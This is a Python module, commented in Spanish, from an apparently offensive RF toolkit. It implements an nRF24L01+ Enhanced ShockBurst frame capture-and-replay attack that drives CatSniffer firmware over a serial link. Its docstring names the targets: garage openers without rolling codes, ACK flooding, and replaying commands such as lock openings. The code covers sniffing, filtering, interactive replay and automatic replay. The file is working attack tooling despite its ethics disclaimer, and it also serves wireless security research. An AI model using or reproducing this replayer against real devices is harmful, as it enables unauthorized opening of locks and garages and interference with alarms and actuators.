"""
RF — nRF24L01+ ESB Frame Replayer
═══════════════════════════════════
Requiere el firmware personalizado `nrf24-sniffer` (CC1352P7) con soporte TX.
Ver firmware/nrf24_sniffer_cc1352p7/README.md para compilar y flashear.

Replay Attack
─────────────
El replayer captura frames ESB en tiempo real y permite retransmitirlos
exactamente tal cual, sin modificación. Útil para:

  • Rolling code bypass — protocolos sin counter (garajes, mandos simples)
  • ACK flooding        — saturar el dongle con ACKs forjados
  • Device confusion    — hacer que el dispositivo receptor reprocese un
                          comando ya ejecutado (Ej: apertura de cerradura)
  • Protocol analysis   — verificar que dos dispositivos reaccionan igual
                          a la misma secuencia de bytes

Flujo del ataque
────────────────
  1. Conectar CatSniffer con firmware nrf24-sniffer (modo PROMISC o DIRECTED)
  2. El replayer muestra los frames capturados numerados
  3. Usuario escribe el número de frame + [Enter] para retransmitirlo
  4. El firmware ejecuta REPLAY:RAW_HEX y confirma con [REPLAY] OK

Comandos UART utilizados (→ firmware)
──────────────────────────────────────
  REPLAY:RAW_HEX\\r\\n     — retransmite frame ESB crudo

Comandos informativos del firmware (←)
────────────────────────────────────────
  [PKT]  ch=... rssi=... len=... raw=HEX     — frame crudo capturado
  [ESB]  ch=... rssi=... addr=... plen=...   — frame decodificado
  [REPLAY] OK len=...                        — confirmación de TX replay
  [REPLAY] ERR ...                           — error en TX replay

Nota de seguridad / ética
──────────────────────────
Esta herramienta es para uso en entornos propios o con permiso explícito.
El replay de frames de dispositivos de control de acceso, alarmas o
actuadores sin autorización puede constituir un delito.
"""

from __future__ import annotations

import re
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime
from typing import Optional

import serial
from rich.console import Console
from rich.live import Live
from rich.panel import Panel
from rich.prompt import Prompt
from rich.table import Table
from rich.text import Text

from attacks.base import BaseAttack, AttackOption
from attacks.registry import AttackRegistry
from core import ui as UI
from core.firmware import flash_firmware

console = Console()

# ── Modelos de datos ──────────────────────────────────────────────────────────

@dataclass
class CapturedFrame:
    """Frame ESB capturado listo para replay."""
    index:       int
    channel:     int
    rssi:        int
    raw_hex:     str           # frame completo (addr+PCF+payload+CRC) en hex
    addr:        str = ""      # dirección decodificada (si disponible)
    payload_hex: str = ""      # payload decodificado (si disponible)
    payload_len: int = 0
    pid:         int = 0
    crc_ok:      bool = True
    ts:          str = field(default_factory=lambda: datetime.now().strftime("%H:%M:%S"))
    replayed:    int = 0       # veces que se ha retransmitido este frame


# ── Expresiones regulares del protocolo UART ─────────────────────────────────

_PKT_RE = re.compile(
    r"\[PKT\]\s+ch=(\d+)\s+rssi=([+-]?\d+)\s+len=(\d+)\s+raw=([0-9A-Fa-f]+)"
)
_ESB_RE = re.compile(
    r"\[ESB\]\s+ch=(\d+)\s+rssi=([+-]?\d+)\s+addr=([0-9A-Fa-f]+)"
    r"\s+plen=(\d+)\s+pid=(\d+)\s+noack=\d+\s+pld=([0-9A-Fa-f]*)\s+crc=(\w+)"
)
_REPLAY_OK_RE  = re.compile(r"\[REPLAY\]\s+OK\s+len=(\d+)")
_REPLAY_ERR_RE = re.compile(r"\[REPLAY\]\s+ERR\s+(.*)")
_CMD_RE        = re.compile(r"\[CMD\]\s+(.*)")


# ── Módulo de ataque ──────────────────────────────────────────────────────────

@AttackRegistry.register
class NRF24Replayer(BaseAttack):
    """
    nRF24L01+ ESB Frame Replayer — captura y retransmite frames ESB en tiempo real.

    Captura paquetes del sniffer firmware y permite seleccionar cualquier
    frame para retransmitirlo (replay attack). Soporta replay único,
    en bucle y replay de los últimos N frames capturados.
    """

    name           = "nrf24_replayer"
    description    = "nRF24L01+ ESB frame capture + replay attack"
    firmware_alias = "nrf24-sniffer"
    category       = "RF"

    options = [
        AttackOption("flash",        "Flashear firmware antes de ejecutar (s/n)",
                     default="n", type=str),
        AttackOption("port",         "Puerto serie del CatSniffer",
                     default="/dev/ttyACM0", type=str),
        AttackOption("baud",         "Baud rate UART",
                     default=115200, type=int),
        AttackOption("channel",      "Canal inicial (0-125 o 'scan')",
                     default="76", type=str),
        AttackOption("mode",         "Modo captura: promisc | directed",
                     default="promisc", type=str,
                     choices=["promisc", "directed"]),
        AttackOption("addr",         "Dirección target en modo directed (hex, 5 bytes)",
                     default="E7E7E7E7E7", type=str),
        AttackOption("max_frames",   "Máximo de frames a almacenar en buffer (10-500)",
                     default=100, type=int),
        AttackOption("auto_replay",  "Retransmitir automáticamente cada frame capturado (s/n)",
                     default="n", type=str),
        AttackOption("replay_delay", "Delay entre replays automáticos (ms)",
                     default=200, type=int),
        AttackOption("filter_addr",  "Filtrar frames por addr hex (vacío = todos)",
                     default="", type=str),
    ]

    # ── Internals ─────────────────────────────────────────────────────────────

    def __init__(self) -> None:
        super().__init__()
        self._ser:     Optional[serial.Serial] = None
        self._lock     = threading.Lock()
        self._frames:  list[CapturedFrame] = []
        self._pending: Optional[str] = None   # raw_hex a retransmitir
        self._replay_ok  = 0
        self._replay_err = 0
        self._last_pkt_raw: dict[int, str] = {}   # channel → raw_hex del último [PKT]

    # ── Helpers serie ─────────────────────────────────────────────────────────

    def _send_cmd(self, cmd: str) -> None:
        if self._ser and self._ser.is_open:
            self._ser.write((cmd + "\r\n").encode("ascii"))

    def _set_channel(self, ch_str: str) -> None:
        ch_str = ch_str.strip().upper()
        if ch_str == "SCAN":
            self._send_cmd("CH:SCAN")
        else:
            try:
                ch = int(ch_str)
                self._send_cmd(f"CH:{ch:03d}")
            except ValueError:
                pass
        time.sleep(0.05)

    def _set_mode_promisc(self) -> None:
        self._send_cmd("MODE:PROMISC")
        time.sleep(0.05)

    def _set_mode_directed(self, addr: str) -> None:
        self._send_cmd(f"ADDR:{addr.upper()}")
        time.sleep(0.05)

    # ── Lector de líneas UART ────────────────────────────────────────────────

    def _uart_reader(self) -> None:
        """Thread: lee líneas del firmware y actualiza self._frames."""
        buf = b""
        while self._running:
            try:
                if self._ser and self._ser.in_waiting:
                    buf += self._ser.read(self._ser.in_waiting)
                else:
                    time.sleep(0.005)
                    continue

                while b"\n" in buf:
                    line_b, buf = buf.split(b"\n", 1)
                    line = line_b.decode("ascii", errors="replace").strip()
                    self._process_line(line)

            except (serial.SerialException, OSError):
                break

    def _process_line(self, line: str) -> None:
        """Parsea una línea del firmware y actualiza el buffer de frames."""
        filter_addr = self.get_option("filter_addr").upper().replace(":", "")

        m_pkt = _PKT_RE.match(line)
        if m_pkt:
            ch, rssi, _ln, raw_hex = m_pkt.groups()
            ch   = int(ch)
            rssi = int(rssi)
            raw_hex = raw_hex.upper()
            # Guardar el raw más reciente por canal para correlacionar con ESB
            with self._lock:
                self._last_pkt_raw[ch] = raw_hex
            return

        m_esb = _ESB_RE.match(line)
        if m_esb:
            ch, rssi, addr, plen, pid, pld, crc = m_esb.groups()
            ch   = int(ch)
            rssi = int(rssi)
            addr = addr.upper()

            # Filtrado por addr
            if filter_addr and not addr.startswith(filter_addr):
                return

            with self._lock:
                raw_hex = self._last_pkt_raw.get(ch, "")
                if not raw_hex:
                    return  # sin raw asociado, no podemos hacer replay útil

                max_f = max(10, min(500, self.get_option("max_frames")))
                idx   = len(self._frames)
                frame = CapturedFrame(
                    index       = idx,
                    channel     = ch,
                    rssi        = rssi,
                    raw_hex     = raw_hex,
                    addr        = addr,
                    payload_hex = pld.upper(),
                    payload_len = int(plen),
                    pid         = int(pid),
                    crc_ok      = (crc == "OK"),
                )
                self._frames.append(frame)
                if len(self._frames) > max_f:
                    self._frames.pop(0)
                    # Reindexar
                    for i, f in enumerate(self._frames):
                        f.index = i

                # Auto-replay si está activado
                auto = self.get_option("auto_replay").lower() in ("s", "y", "1", "si", "yes")
                if auto:
                    self._pending = raw_hex

    # ── Replay ───────────────────────────────────────────────────────────────

    def _do_replay(self, raw_hex: str) -> bool:
        """Envía REPLAY:RAW_HEX y confirma respuesta del firmware."""
        self._send_cmd(f"REPLAY:{raw_hex}")
        deadline = time.time() + 1.5
        buf = b""
        while time.time() < deadline:
            if self._ser and self._ser.in_waiting:
                buf += self._ser.read(self._ser.in_waiting)
                decoded = buf.decode("ascii", errors="replace")
                if _REPLAY_OK_RE.search(decoded):
                    with self._lock:
                        self._replay_ok += 1
                    return True
                if _REPLAY_ERR_RE.search(decoded):
                    with self._lock:
                        self._replay_err += 1
                    return False
            time.sleep(0.01)
        with self._lock:
            self._replay_err += 1
        return False

    # ── UI ───────────────────────────────────────────────────────────────────

    def _build_panel(self, done: bool = False) -> Panel:
        with self._lock:
            frames = list(self._frames)
            replay_ok  = self._replay_ok
            replay_err = self._replay_err

        # Tabla de frames capturados (últimos 12)
        tbl = Table(show_header=True, header_style="bold cyan",
                    show_lines=False, padding=(0, 1))
        tbl.add_column("#",       style="dim",       width=4)
        tbl.add_column("Addr",    style="cyan",      width=12)
        tbl.add_column("Ch",      style="yellow",    width=4)
        tbl.add_column("RSSI",    style="magenta",   width=6)
        tbl.add_column("pLen",    style="white",     width=5)
        tbl.add_column("PID",     style="white",     width=4)
        tbl.add_column("CRC",     style="white",     width=4)
        tbl.add_column("Payload", style="green",     width=24)
        tbl.add_column("Rplyd",   style="red",       width=5)
        tbl.add_column("Time",    style="dim",       width=10)

        recent = frames[-12:] if len(frames) > 12 else frames
        for f in reversed(recent):
            pld_short = (f.payload_hex[:20] + "…") if len(f.payload_hex) > 20 else f.payload_hex
            crc_mark  = "[green]OK[/green]" if f.crc_ok else "[red]FAIL[/red]"
            tbl.add_row(str(f.index), f.addr, str(f.channel),
                        f"{f.rssi:+d}", str(f.payload_len), str(f.pid),
                        crc_mark, pld_short, str(f.replayed), f.ts)

        # Stats
        stats = Table(show_header=False, box=None, padding=(0, 1))
        stats.add_column("k", style="bold cyan")
        stats.add_column("v", style="white")
        stats.add_row("Frames capturados", str(len(frames)))
        stats.add_row("Replay OK",         f"[green]{replay_ok}[/green]")
        stats.add_row("Replay ERR",        f"[red]{replay_err}[/red]")
        stats.add_row("Control",
                      "[dim]Escribe # frame + Enter para replay / Ctrl+C para salir[/dim]")

        from rich.console import Group
        body  = Group(tbl, stats)
        title = "[bold yellow] nRF24 Replayer [/bold yellow]"
        if done:
            title += "[bold green] COMPLETADO[/bold green]"
        return Panel(body, title=title, border_style="yellow")

    # ── run() ─────────────────────────────────────────────────────────────────

    def run(self, device) -> None:
        """Ejecuta el replayer interactivo."""

        do_flash     = self.get_option("flash").lower() in ("s", "y", "1", "si", "yes")
        port         = self.get_option("port")
        baud         = self.get_option("baud")
        channel      = self.get_option("channel")
        mode         = self.get_option("mode")
        addr_opt     = self.get_option("addr").upper().replace(":", "").replace(" ", "")
        auto_replay  = self.get_option("auto_replay").lower() in ("s", "y", "1", "si", "yes")
        replay_delay = max(1, self.get_option("replay_delay"))

        # ── Flash firmware ────────────────────────────────────────────────────
        if do_flash:
            if not flash_firmware(device, self.firmware_alias):
                return

        # ── Abrir puerto serie ────────────────────────────────────────────────
        try:
            self._ser = serial.Serial(port, baud, timeout=0.1)
        except serial.SerialException as exc:
            console.print(f"[red]No se puede abrir {port}: {exc}[/red]")
            return

        time.sleep(0.3)
        self._ser.reset_input_buffer()

        # Configurar firmware
        self._set_channel(channel)
        if mode == "directed":
            self._set_mode_directed(addr_opt)
        else:
            self._set_mode_promisc()

        # ── Arrancar lector UART ──────────────────────────────────────────────
        self._running = True
        reader_thread = threading.Thread(target=self._uart_reader, daemon=True)
        reader_thread.start()

        console.print(
            f"\n[bold yellow]nRF24 Replayer activo.[/bold yellow] "
            f"Canal: [cyan]{channel}[/cyan]  Modo: [cyan]{mode}[/cyan]\n"
            f"Escribe el número (#) de un frame capturado + Enter para hacer replay.\n"
            f"Ctrl+C para salir.\n"
        )

        try:
            with Live(self._build_panel(), console=console,
                      refresh_per_second=2) as live:
                while self._running:
                    # Auto-replay
                    if auto_replay:
                        with self._lock:
                            pending = self._pending
                            self._pending = None
                        if pending:
                            self._do_replay(pending)
                            time.sleep(replay_delay / 1000.0)
                        else:
                            time.sleep(0.05)
                        live.update(self._build_panel())
                        continue

                    # Input interactivo (no bloqueante gracias al Live)
                    live.update(self._build_panel())

                    # El Live bloquea la consola, así que leemos sin Live
                    live.stop()
                    try:
                        raw_input = input("[replay] Número de frame (Enter para actualizar): ").strip()
                    except EOFError:
                        break
                    live.start()

                    if not raw_input:
                        continue

                    # Comandos especiales
                    if raw_input.lower() in ("q", "quit", "exit", "salir"):
                        break

                    # Replay por número de frame
                    if raw_input.isdigit():
                        idx = int(raw_input)
                        with self._lock:
                            frames = list(self._frames)
                        match = next((f for f in frames if f.index == idx), None)
                        if match:
                            console.print(
                                f"[yellow]Replay frame #{idx} "
                                f"addr={match.addr} ch={match.channel} "
                                f"pLen={match.payload_len}...[/yellow]"
                            )
                            ok = self._do_replay(match.raw_hex)
                            if ok:
                                match.replayed += 1
                                console.print("[green]Replay exitoso[/green]")
                            else:
                                console.print("[red]Replay fallido (ver [REPLAY] ERR en firmware)[/red]")
                        else:
                            console.print(f"[red]Frame #{idx} no encontrado[/red]")

                    # Replay del último frame
                    elif raw_input.lower() in ("last", "ultimo", "último", "l"):
                        with self._lock:
                            frames = list(self._frames)
                        if frames:
                            last = frames[-1]
                            console.print(f"[yellow]Replay último frame #{last.index}...[/yellow]")
                            ok = self._do_replay(last.raw_hex)
                            if ok:
                                last.replayed += 1
                                console.print("[green]Replay exitoso[/green]")
                            else:
                                console.print("[red]Replay fallido[/red]")

                    live.update(self._build_panel())

        except KeyboardInterrupt:
            console.print("\n[yellow]Interrumpido por el usuario[/yellow]")
        finally:
            self._running = False
            if self._ser and self._ser.is_open:
                self._ser.close()
            reader_thread.join(timeout=1.0)

        console.print(
            f"\n[bold yellow]Replayer detenido.[/bold yellow] "
            f"Frames capturados: [cyan]{len(self._frames)}[/cyan]  "
            f"Replays OK: [green]{self._replay_ok}[/green]  "
            f"Replays ERR: [red]{self._replay_err}[/red]"
        )
